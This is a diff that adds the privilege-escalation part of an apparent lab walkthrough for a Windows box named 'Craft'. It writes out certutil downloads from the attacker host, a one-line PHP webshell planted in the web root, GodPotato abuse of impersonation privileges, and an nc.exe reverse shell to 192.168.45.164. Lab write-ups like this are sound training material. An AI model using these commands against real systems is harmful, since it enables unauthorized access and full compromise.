@@ -116,3 +116,105 @@ Then we check our listener.
 ![](Images/Craft29.png)
 Captured local flag.
 ![](Images/Craft30.png)
+
+### Privilege Escalation
+Now that we are on the box, let’s look around a little.
+![](Images/Craft31.png)
+We see that there is another, likely better, user. Apache is a service after all.
+![](Images/Craft32.png)
+Looking at the root directory, the first things I try to identify are items that are not default. In this case, java, Windows10Upgrade, xampp, and output.txt should all be investigated.
+![](Images/Craft33.png)
+
+Before I really pick at these items, I like to get a read of the environment from Winpeas. Let’s put it on the box.
+```PS
+certutil -urlcache -split -f http://192.168.45.164/winPEASany.exe winPEASany.exe
+OR
+iwr http://192.168.45.164/winPEASany.exe -outfile winPEASany.exe
+```
+
+![](Images/Craft34.png)
+
+Run it. I copy the interesting sections to my notes.
+![](Images/Craft35.png)
+![](Images/Craft36.png)
+This is again suggesting to me that we should attempt a lateral escalation to the apache user since they are currently logged in. They likely have service level permissions (i.e. SeImpersonatePrivilege).
+![](Images/Craft37.png)
+Apache comes up again along with a generically named service. Could be useful if we can get the ability to stop/start services and can replace the service binary.
+![](Images/Craft38.png)
+This directory really sticks out from our exploration of the root directory earlier. Okay let’s return to the root directory and check it out. In doing so, I realize I have writable access to C:\xampp\htdocs
+![](Images/Craft39.png)
+This is the root of the web server! There’s our index and upload PHP files. That means this directory is browsable from the outside. Good to know. Let’s create a PHP webshell and verify that PHP execution is performed by apache.
+
+I return to Kali to create the basic web shell.
+```sh
+<?php system($_GET['cmd']); ?>
+```
+
+![](Images/Craft40.png)
+We can then transfer it to the victim machine.
+```PS
+certutil -urlcache -split -f http://192.168.45.164/cmd.php cmd.php
+```
+![](Images/Craft41.png)
+![](Images/Craft42.png)
+Now we are able to browse to it and take advantage of the code.
+![](Images/Craft43.png)
+Tada! Well in that case, I’m going to put a complete PHP reverse shell in the HTML root directory as well. I like to use this one for Windows machines:
+![](Images/Craft44.png)
+![](Images/Craft45.png)
+Pull it over to the victim and set up a listener on your chosen port.
+![](Images/Craft46.png)
+![](Images/Craft47.png)
+Browse to it like before.
+![](Images/Craft48.png)
+Check you listener.
+![](Images/Craft49.png)
+That’s what we were hoping for. This is a prime set up for the GodPotato escalation path.
+https://github.com/BeichenDream/GodPotato/releases?source=post_page-----4a62baf140cc---------------------------------------
+First we need to know the >NET framework version.
+```cmd
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
+```
+![](Images/Craft50.png)
+Then we move the exploit on ==the== box.
+```cmd
+certutil -urlcache -split -f http://192.168.45.164/GodPotato-NET4.exe
+```
+![](Images/Craft51.png)
+Now we test it with something simple.
+```cmd
+.\GodPotato-NET4.exe -cmd "whoami"
+```
+![](Images/Craft52.png)
+
+It works! The end is in sight, we only have to turn this into another reverse shell.
+
+I like to stick with simple programs that work consistently so I’m going to grab the version of netcat.
+
+```cmd
+certutil -urlcache -split -f http://192.168.45.164/nc.exe nc.exe
+```
+
+![](Images/Craft53.png)
+
+Now we will replace a reverse shell payload with the “whoami”, but first I like to test the payload _on its own_ before I run it through GodPotato.
+
+```cmd
+.\nc.exe 192.168.45.164 6666  -e c:\windows\system32\cmd.exe
+```
+
+![](Images/Craft54.png)
+
+It works, so all together the payload command is:
+
+```cmd
+.\GodPotato-NET4.exe -cmd ".\nc.exe 192.168.45.164 6666  -e c:\windows\system32\cmd.exe"
+```
+
+![](Images/Craft55.png)
+
+Going back to the listener to see the connection.
+
+![](Images/Craft56.png)
+
+![](Images/Craft57.png)
